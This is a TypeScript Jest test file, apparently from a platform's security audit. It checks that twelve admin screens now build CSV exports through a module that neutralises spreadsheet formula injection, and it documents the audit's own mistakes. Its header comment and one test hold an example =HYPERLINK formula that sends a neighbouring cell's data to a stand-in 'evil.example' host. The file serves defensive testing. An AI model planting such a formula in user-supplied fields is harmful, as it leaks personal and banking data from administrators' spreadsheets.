/**
 * @jest-environment node
 */

/**
 *   #740 THE CSV RULE WAS WRITTEN FOR THE SERVER'S FOUR EXPORTS. TWELVE ADMIN
 *        SCREENS BUILD THEIR OWN, IN THE BROWSER, AND NONE OF THEM GOT IT.
 *
 *   `lib/csv-safe.ts` exists because three server exports each grew their own
 *   cell-quoting expression. Its header names them, and says of the shape all
 *   three shared:
 *
 *       `"${String(c).replace(/"/g, '""')}"`
 *       "The first two double embedded quotes and NEUTRALISE NOTHING."
 *
 *   It then fixed those three, plus the audit-log export. Four call sites.
 *
 *   The platform has fourteen CSV exports, not four. The other ten — plus two
 *   more the header never counted — are on ADMIN PAGES, built in the browser
 *   from an array of rows, and every one of them carried a verbatim copy of the
 *   expression its own shared module calls useless.
 *
 * ── THE FOURTH QUADRANT ─────────────────────────────────────────────────────
 *
 *   There are two rules about CSV exports and two places exports are built, and
 *   the audit has already filled three of the four boxes:
 *
 *                          BROWSER (12 screens)      SERVER (3 routes + audit)
 *       RECORDED           #309                      #528
 *       CELL-SAFE          ← this                    csv-safe
 *
 *   #309 walked src/app/admin for `.tsx` files emitting `text/csv` and gave
 *   those fourteen screens RECORDING. #528 found that the same walk could never
 *   reach a `.ts` route handler and extended recording to the server. csv-safe
 *   then gave the server CELL SAFETY — and stopped there.
 *
 *   Nothing ever walked back. The twelve screens needing it are the exact list
 *   #309 derived years of findings ago; its comment is still sitting on every
 *   one of them:
 *
 *       "#309 The download is recorded. Fourteen admin screens built a CSV
 *        and two of them left a trace..."
 *
 *   A correct rule applied to some of the places it names — this audit's most
 *   common defect — except here the places were already enumerated, in a
 *   comment, in each of the files that needed the fix.
 *
 * ── WHAT THE UNNEUTRALISED CELL CARRIES ─────────────────────────────────────
 *
 *   These are not cosmetic columns. wave/members and wave/applications export
 *   NIN and BVN; five screens export bank name and account number; finance
 *   exports amounts, phone numbers and gateway reasons. Every one of those rows
 *   also carries a name the user typed themselves.
 *
 *   A member whose full name is
 *
 *       =HYPERLINK("https://evil.example?d="&B2,"Payroll")
 *
 *   produces a working link in the admin's spreadsheet, labelled however they
 *   chose, carrying the neighbouring cell — which on the WAVE exports is the
 *   next person's row. Quoting does not help: the quotes are stripped before
 *   the formula decision is made.
 *
 * ── AND ONE OF THE THIRTEEN DID NOT EVEN QUOTE ──────────────────────────────
 *
 *   wave/members has TWO exports. The single-member card built its rows by raw
 *   interpolation — `Full Name,"${getDisplayName(m)}"` — with no doubling at
 *   all, so a name containing one `"` ends the field early and shifts
 *   everything after it into the wrong column. That is the third shape
 *   csv-safe's header describes: the one that "does not even do that".
 *
 * ── TWO FAULTS IN MY OWN SWEEP, BOTH CAUGHT BY IT, BOTH RECORDED ────────────
 *
 *   The first version flagged academy/applications for a quoted interpolation
 *   that turned out to be the empty-state message `No results for "${search}"`,
 *   four hundred lines from any CSV. File-level matching for a use-level claim
 *   — the eighth time this audit has filed that. Anchored on the field
 *   separator now; the note sits on the pattern.
 *
 *   The second asserted the hand-rolled doubling was absent from csv-safe after
 *   stripping. It is not absent, and should not be: that expression IS the
 *   module's implementation. Counted instead of asserted-away, which fails both
 *   on a gutted file and on a stripper that did nothing.
 *
 *   MUTATION-TESTED, WITH A CONTROL — table at the foot of this file. The table
 *   was WRITTEN BEFORE THE SWEEP RAN, which is the wrong order and is recorded
 *   here rather than tidied away. The sweep was then run in full and every row
 *   below is its actual result.
 */

import { describe, it, expect } from '@jest/globals';
import { readFileSync, readdirSync } from 'fs';
import { join, relative, sep } from 'path';
import { stripComments } from '@/lib/testing/strip-comments';
import { csvCell, csvRow, csvDocument } from '@/lib/csv-safe';

const ROOT = process.cwd();
const code = (rel: string) => stripComments(readFileSync(join(ROOT, rel), 'utf-8'), { label: rel });

function sourceFiles(): string[] {
    const files: string[] = [];
    const walk = (dir: string) => {
        for (const e of readdirSync(dir, { withFileTypes: true })) {
            const full = join(dir, e.name);
            if (e.isDirectory()) {
                if (e.name === '__tests__' || e.name === 'node_modules') continue;
                walk(full);
                continue;
            }
            if (/\.tsx?$/.test(e.name)) files.push(relative(ROOT, full).split(sep).join('/'));
        }
    };
    walk(join(ROOT, 'src'));
    return files;
}

/** The expression csv-safe's own header quotes, copied into twelve screens. */
const HAND_ROLLED = /replace\(\s*\/"\/g\s*,\s*'""'\s*\)/;

/**
 * And the shape of the one that did not even double.
 *
 *   ANCHORED ON THE FIELD SEPARATOR, not on "a quoted interpolation". The first
 *   version was the latter and immediately flagged academy/applications, which
 *   builds a CSV *and*, four hundred lines away, renders the empty state
 *   `No results for "${search}"`. Nothing to do with a spreadsheet. The same
 *   file-level-for-use-level trap this audit keeps filing — eighth occurrence.
 *
 *   The real thing was `Full Name,"${getDisplayName(m)}"`: a comma, then a
 *   quoted interpolation. That comma is the CSV field boundary and is what
 *   makes it a cell rather than a sentence.
 */
const RAW_CSV_FIELD = /,\s*"\$\{[^}]*\}"/;

const USES_SAFE = /\bcsv(Cell|Row|Document)\b/;

// ─────────────────────────────────────────────────────────────────────────────
describe('#740 — the cell rule itself, exercised rather than described', () => {
    it('A FORMULA LEAD IS NEUTRALISED, WHICH QUOTING ALONE NEVER DID', () => {
        //   The four leads a spreadsheet acts on, and the two whitespace
        //   characters stripped before that decision.
        for (const lead of ['=', '+', '-', '@', '\t', '\r']) {
            expect(csvCell(`${lead}HYPERLINK("https://evil.example","x")`)).toMatch(/^"'/);
        }
    });

    it('AND AN ORDINARY VALUE IS NOT MANGLED', () => {
        //   Vacuity guard: a function that prefixed everything would corrupt
        //   every name, email and amount on the platform.
        expect(csvCell('Ada Obi')).toBe('"Ada Obi"');
        expect(csvCell('')).toBe('""');
        expect(csvCell(null)).toBe('""');
    });

    it('AND AN EMBEDDED QUOTE STILL DOUBLES — the half that was already right', () => {
        expect(csvCell('Ada "Doc" Obi')).toBe('"Ada ""Doc"" Obi"');
    });

    it('AND THE HEADER ROW GOES THROUGH THE SAME FUNCTION', () => {
        /*
         *   Static today. A header assembled from a column the caller chose is
         *   how the one unescaped path comes back, which is csv-safe's own
         *   argument for this.
         */
        expect(csvDocument(['=Name'], [['Ada']])).toBe('"\'=Name"\n"Ada"');
    });

    it('AND A ROW IS COMMA-JOINED, SO THE SHAPE THE SCREENS LOST IS PRESERVED', () => {
        expect(csvRow(['a', 'b'])).toBe('"a","b"');
    });
});

// ─────────────────────────────────────────────────────────────────────────────
describe('#740 — and no file builds a CSV cell by hand any more', () => {
    it('THE HAND-ROLLED QUOTING EXPRESSION IS GONE FROM THE SOURCE', () => {
        /*
         *   STRIPPED, NOT RAW. csv-safe's header QUOTES this expression three
         *   times to explain why it is wrong, so a raw-source sweep reports the
         *   fix itself as the offender — the same shape data-export-record.ts
         *   records for #309, whose sweep matched `text/csv` on a line that
         *   merely SNIFFS the content type.
         *
         *   csv-safe is excluded for a different reason: the doubling in its
         *   BODY is not a copy of the rule, it is the rule. The module that
         *   defines a thing is not a caller of it — the same exclusion #739
         *   made for the adapter that defines `.offset(`. Its body is asserted
         *   on its own, below.
         */
        const offenders = sourceFiles()
            .filter((f) => f !== 'src/lib/csv-safe.ts')
            .filter((f) => HAND_ROLLED.test(code(f)));
        expect(offenders).toEqual([]);
    });

    it('AND SO IS THE ONE THAT DID NOT EVEN DOUBLE', () => {
        const offenders = sourceFiles()
            .filter((f) => /text\/csv/.test(code(f)))
            .filter((f) => RAW_CSV_FIELD.test(code(f)));
        expect(offenders).toEqual([]);
    });

    it('AND EVERY SCREEN THAT ASSEMBLES A CSV GOES THROUGH THE MODULE', () => {
        /*
         *   Swept, not listed. A fifteenth export screen added next quarter is
         *   the next instance of this finding, and a list of twelve cannot
         *   notice it.
         *
         *   "Assembles" is the distinction that matters: two of the fourteen —
         *   audit-logs and wave/compliance — DOWNLOAD a CSV the server already
         *   built, and correctly contain no cell construction at all. Requiring
         *   the import of them would be requiring an unused import.
         */
        const assemblers = sourceFiles()
            .filter((f) => f !== 'src/lib/csv-safe.ts')
            .filter((f) => {
                const src = code(f);
                return /text\/csv/.test(src) && /\.join\(\s*","\s*\)/.test(src);
            });

        const unsafe = assemblers.filter((f) => !USES_SAFE.test(code(f)));
        expect(unsafe).toEqual([]);
    });

    it('AND THE TWELVE SCREENS ACTUALLY IMPORT IT — the count, held', () => {
        /*
         *   The sweep above goes quiet in two ways: if the screens stopped
         *   emitting `text/csv`, or if they stopped comma-joining. Either would
         *   empty `assemblers` and pass. So the population is pinned from the
         *   other direction.
         */
        const importers = sourceFiles()
            .filter((f) => f.startsWith('src/app/admin/'))
            .filter((f) => /from "@\/lib\/csv-safe"/.test(code(f)));

        expect(importers.length).toBe(12);
    });
});

// ─────────────────────────────────────────────────────────────────────────────
describe('#740 — and the sweep can see an offender, so [] means clean', () => {
    it('BOTH PATTERNS RECOGNISE WHAT THEY WERE WRITTEN FOR', () => {
        //   The exact text that stood in twelve screens, and in the thirteenth.
        expect(HAND_ROLLED.test('r.map(c => `"${String(c).replace(/"/g, \'""\')}"`)')).toBe(true);
        expect(RAW_CSV_FIELD.test('`Full Name,"${getDisplayName(m)}"`')).toBe(true);

        //   And neither fires on the repaired shape.
        expect(HAND_ROLLED.test('const csv = csvDocument(headers, rows);')).toBe(false);
        expect(RAW_CSV_FIELD.test('const csv = csvDocument(headers, rows);')).toBe(false);

        //   Nor on the sentence that made the first version of this wrong.
        expect(RAW_CSV_FIELD.test('`No results for "${search}"`')).toBe(false);
    });

    it('AND THE FILE LIST IS NOT EMPTY, WHICH IS THE OTHER WAY TO PASS', () => {
        /*
         *   A walker that returned nothing would satisfy every toEqual([])
         *   above. It has to find the repaired screens specifically, not just
         *   "some files".
         */
        const files = sourceFiles();
        expect(files.length).toBeGreaterThan(500);
        expect(files).toContain('src/app/admin/wave/members/page.tsx');
        expect(files).toContain('src/lib/csv-safe.ts');
    });

    it('AND STRIPPING LEAVES csv-safe READABLE, NOT GUTTED', () => {
        /*
         *   The stripper's own trap 1: a naive one returns an empty file and
         *   every not.toContain passes for the wrong reason. csv-safe is the
         *   file with the most comment in it, so it is the one to check.
         */
        const raw = readFileSync(join(ROOT, 'src/lib/csv-safe.ts'), 'utf-8');
        const src = code('src/lib/csv-safe.ts');

        expect(src).toContain('export function csvCell');
        expect(src).toContain('FORMULA_LEAD');

        /*
         *   COUNTED, NOT ABSENT. My first version asserted the doubling was
         *   gone from the stripped file — wrong, because the doubling in the
         *   BODY is the live implementation. Three occurrences in the raw file,
         *   one after stripping: the two header quotations went and the code
         *   stayed. A gutted file would give 0 and a stripper that did nothing
         *   would give 3, so this single number fails in both directions.
         */
        const all = /replace\(\s*\/"\/g\s*,\s*'""'\s*\)/g;
        expect(raw.match(all)?.length).toBe(3);
        expect(src.match(all)?.length).toBe(1);
    });
});

/*
 * ── MUTATION TESTING ────────────────────────────────────────────────────────
 *
 *   Baseline green, one anchored swap at a time, restored from a snapshot copy,
 *   each mutant proving its edit landed by a unique string on disk. Run AFTER
 *   this table was written — see the note in the header.
 *
 *     MUTANT                                                        RESULT
 *     csvCell stops neutralising the formula lead                    KILLED
 *     csvCell neutralises every value, not just formula leads        KILLED
 *     csvCell stops doubling embedded quotes                         KILLED
 *     csvDocument passes headers through raw                         KILLED
 *     one screen goes back to the hand-rolled expression             KILLED
 *     the single-member card goes back to raw interpolation          KILLED
 *     one screen drops the csv-safe import                           KILLED
 *     the sweep stops stripping comments                             KILLED
 *     the file walker returns nothing                                KILLED
 *
 *     CONTROL — SHOULD SURVIVE
 *     reword this header                                             SURVIVED ✓
 */
